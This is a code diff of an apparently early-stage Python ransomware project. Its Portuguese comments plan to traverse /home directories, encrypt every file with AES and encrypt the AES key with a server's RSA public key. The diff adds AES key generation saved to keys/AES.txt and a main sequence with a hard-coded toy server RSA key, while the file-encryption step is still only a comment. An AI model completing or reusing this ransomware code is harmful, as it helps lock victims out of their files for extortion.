@@ -3,7 +3,6 @@
 # by Tarcisio marinho
 # github.com/tarcisio-marinho
 
-#from AES.crypt import *
 import os
 import socket
 from random import choice
@@ -11,7 +10,7 @@ import multiprocessing
 
 from gera_chaves_RSA import *
 from criptografa_descriptografa_arquivo_AES import *
-
+from gera_chaves_RSA import *
 # listar diretorios a partir do /home/
 # cada thread percorre um diretorio
 # for caminho in ls:
@@ -94,22 +93,34 @@ def client(IP_serv):
     #data = socket_obj.recv(1024) # recebeu do servidor a chave publica
 
 def gera_chave_AES():
+    # GERA SENHA AES que vai criptografar os arquivos
+    # Salva senha em arquivo.txt
     tamanho=30
     caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
     senha = ''
     for char in xrange(tamanho):
-            senha += choice(caracters)
+        senha += choice(caracters)
+
+    try:
+        f=open('keys/AES.txt','w')
+    except IOError:
+        os.mkdir('keys')
+        f=open('keys/AES.txt','w')
+    f.write(senha)
+    f.close()
     return senha
 
 
-menu()
-#if __name__=="__main__":
-    # Chave pública do servidor
-    #serv_RSA=[1121,655]
-    # gera a senha AES
-    #senha_AES=gera_chave_AES()
-    # gera a senha RSA
-    #senha_RSA=gera_chaves_RSA()
+# MAIN
+AES_key=gera_chave_AES()
+print('chave AES gerada')
+# chave publica servidor
+serv_RSA=[1121,655]
+# gera_chaves_RSA.py
+valida()
+print('chaves publicas e privada do cliente geradas')
+
+
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
